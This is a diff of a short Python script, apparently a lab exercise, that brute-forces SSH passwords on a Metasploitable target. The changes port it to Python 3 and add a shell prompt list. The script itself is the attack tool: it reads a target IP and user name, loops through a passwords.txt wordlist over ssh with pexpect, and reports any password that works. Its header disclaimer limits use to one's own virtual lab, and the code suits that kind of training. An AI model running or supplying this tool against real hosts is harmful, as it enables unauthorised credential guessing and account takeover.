@@ -6,6 +6,10 @@ import pexpect
 #Description: SSH & FTP attacks against metasploitable machine
 #Disclaimer: This script is meant to be used in your own virtual environment against intentionally vulnerable machines.
 
+
+PROMPT = ['# ', '>>>', '>', '\\$']
+
+
 def connect(user,host,password):
 	ssh_newkey = 'Are you sure you want to continue connecting?'
 	connStr = 'ssh ' + user + '@' + host
@@ -13,7 +17,7 @@ def connect(user,host,password):
 	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword:'])
 
 	if ret == 0:
-		print ('[-] Error Connecting')
+		print('[-] Error Connecting')
 		return
 
 	if ret == 1:
@@ -30,16 +34,16 @@ def connect(user,host,password):
 
 
 def main():
-	host = raw_input("Enter IP: ")
-	user = raw_input("Enter user account name: ")
+	host = input("Enter IP: ")
+	user = input("Enter user account name: ")
 	file = open('passwords.txt','r')
 
 	for passwd in file.readlines():
-
+		passwd = passwd.strip('\n')
 		try:
 			child = connect(user,host,passwd)
-			print '[+] Password Found: ' + passwd
+			print('[+] Password Found: ' + passwd)
 		except:
-			print 'Wrong Password: ' + passwd
+			print('Wrong Password: ' + passwd)
 
 main()
